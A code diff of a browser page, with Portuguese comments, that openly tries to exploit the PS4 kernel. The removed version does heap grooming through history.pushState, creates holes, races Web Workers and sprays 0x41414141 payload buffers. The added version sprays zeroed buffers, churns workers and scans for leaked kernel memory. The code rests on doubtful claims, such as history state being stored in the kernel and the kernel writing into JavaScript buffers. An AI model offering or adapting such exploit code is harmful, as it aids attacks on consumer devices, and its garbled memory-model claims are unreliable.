@@ -2,120 +2,93 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Heap Feng Shui2</title>
+    <title>PS4 Kernel Leak Hunter</title>
     <style>
-        body { background: #1a1a1a; color: #00ff00; font-family: monospace; }
-        .log { border-bottom: 1px solid #333; padding: 2px; }
+        body { background: #000; color: #0f0; font-family: monospace; }
+        .found { color: #ff00ff; font-weight: bold; border: 1px solid #ff00ff; padding: 10px; }
+        .log { border-bottom: 1px solid #333; }
     </style>
 </head>
 <body>
-    <h3>KERNEL HEAP FENG SHUI</h3>
-    <button onclick="runExploit()">INICIAR ATTACK CHAIN (GROOMING)</button>
+    <h3>KERNEL MEMORY LEAK HUNTER</h3>
+    <p>Tentando sobrepor a estrutura da Thread com ArrayBuffers...</p>
+    <button onclick="startHunting()">INICIAR CAÇADA</button>
     <div id="console"></div>
 
     <script>
-        var logElem = document.getElementById('console');
-        function log(msg) {
+        function log(msg, type="") {
             var d = document.createElement('div');
-            d.className = 'log';
-            d.innerText = msg;
-            logElem.appendChild(d);
+            d.className = 'log ' + type;
+            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.getElementById('console').appendChild(d);
         }
 
-        // Arrays para segurar a memória e não deixar o Garbage Collector limpar
-        var grooming = [];
-        var holes = [];
+        // O alvo: ArrayBuffers onde esperamos que o Kernel escreva
+        var targets = [];
+        const SPRAY_SIZE = 2000; 
 
-        // 1. PREPARAÇÃO (GROOMING)
-        // Aloca muita memória de forma organizada
-        function heapGrooming() {
-            log("[1] Iniciando Heap Feng Shui...");
-            
-            // Tamanho do objeto alvo (vamos tentar 2 tamanhos comuns de structs)
-            // Tente mudar este valor se não funcionar: 1024, 2048, 16384 (16KB)
-            const ALLOC_SIZE = 1024 * 128; 
-            
-            // Criamos uma string que ocupa exatamente esse tamanho na memória
-            // (String em JS usa 2 bytes por caractere + cabeçalho)
-            let strPayload = "A".repeat(ALLOC_SIZE / 2);
+        function startHunting() {
+            log("Preparando armadilhas de memória (Buffers zerados)...");
 
-            // Alocamos 1000 itens
-            for (let i = 0; i < 1000; i++) {
-                // history.pushState guarda o estado no Kernel
-                let state = { id: i, data: strPayload };
-                grooming.push(state);
-                history.pushState(state, "", "k" + i);
+            // 1. Criar milhares de buffers vazios (Zeros)
+            // Tamanho 1024 (tamanho provável de struct de thread)
+            for(let i=0; i<SPRAY_SIZE; i++) {
+                targets[i] = new Uint32Array(1024 / 4); // 1024 bytes
             }
-            
-            log("[+] Memória organizada (1000 blocos alocados).");
-            createHoles();
-        }
 
-        // 2. CRIAR BURACOS (HOLES)
-        // Removemos itens estratégicos para forçar o Kernel a usar esses espaços
-        function createHoles() {
-            log("[2] Criando buracos controlados...");
+            log("Disparando Race Condition (Thread TCB)...");
             
-            // Vamos liberar um a cada 50 itens
-            // Isso cria "ilhas" de memória livre cercadas por memória nossa
-            for (let i = 500; i < 1000; i += 50) {
-                // Ao fazer replaceState com null, liberamos a memória antiga
-                history.replaceState(null, "", "k" + i);
-                holes.push(i); // Guardamos onde está o buraco
-            }
-            
-            log(`[+] ${holes.length} buracos criados. Disparando Race Condition...`);
-            setTimeout(triggerRace, 100);
-        }
-
-        // 3. DISPARAR A CORRIDA
-        // Agora que temos buracos, criamos a thread. O Kernel deve colocar a thread
-        // em um dos nossos buracos.
-        function triggerRace() {
+            // 2. O Worker Explosivo
             const blob = new Blob([`
-                self.onmessage = function() {
-                    // A thread vive pouco
+                self.onmessage = function(e) {
+                    // Tenta alocar/desalocar rápido e morrer
+                    let d = new Date();
                     self.close();
                 }
             `], {type: 'application/javascript'});
             const url = URL.createObjectURL(blob);
 
-            // Tentamos atingir apenas os buracos que criamos
+            // 3. Loop de Tentativas
             let attempts = 0;
-            
             let iv = setInterval(() => {
                 attempts++;
                 
-                // Cria Worker
-                let w = new Worker(url);
-                w.postMessage("start");
-                
-                // Tenta SOBRESCREVER o buraco imediatamente
-                // Se a thread pegou o buraco e morreu, nós tentamos pegar de volta
-                // com dados maliciosos (0x41414141)
-                let payload = new Uint32Array(1024 * 8); // 32KB buffer
-                payload.fill(0x41414141);
-                
-                try {
-                    // Envia buffer via postMessage para tentar reocupar o slot
-                    w.postMessage(payload, [payload.buffer]);
-                } catch(e) {}
-
-                if (attempts > 200) {
-                    clearInterval(iv);
-                    log("[-] Tentativas finalizadas. Se não crashou, ajuste o ALLOC_SIZE.");
+                // Cria e mata threads para agitar o Kernel Heap
+                for(let k=0; k<10; k++) {
+                    let w = new Worker(url);
+                    w.postMessage("go");
                 }
-            }, 5); // Intervalo curto
+
+                // 4. A VERIFICAÇÃO (O "DUMP")
+                // Checamos se algum dos nossos buffers deixou de ser zero
+                checkMemory();
+
+                if(attempts % 50 === 0) log(`Ciclo ${attempts}: Nada encontrado ainda...`);
+                
+                // Segurança para não travar o browser totalmente
+                if(attempts > 500) {
+                    clearInterval(iv);
+                    log("Fim das tentativas. Tente recarregar.");
+                }
+            }, 20);
         }
 
-        function runExploit() {
-            try {
-                heapGrooming();
-            } catch(e) {
-                log("Erro: " + e.message);
+        function checkMemory() {
+            // Varre nossos buffers procurando "Ouro"
+            for(let i=0; i < SPRAY_SIZE; i++) {
+                let arr = targets[i];
+                // Checa apenas o início e fim para ser rápido
+                if (arr[0] !== 0 || arr[1] !== 0 || arr[10] !== 0) {
+                    
+                    // ACHAMOS ALGO!
+                    log(`[!!!] LEAK ENCONTRADO NO BUFFER ${i}!`, "found");
+                    log(`Dados: 0x${arr[0].toString(16)} 0x${arr[1].toString(16)}...`, "found");
+                    
+                    // Se acharmos, paramos tudo para analisar
+                    throw "LEAK FOUND"; 
+                }
             }
         }
     </script>
 </body>
 </html>
-
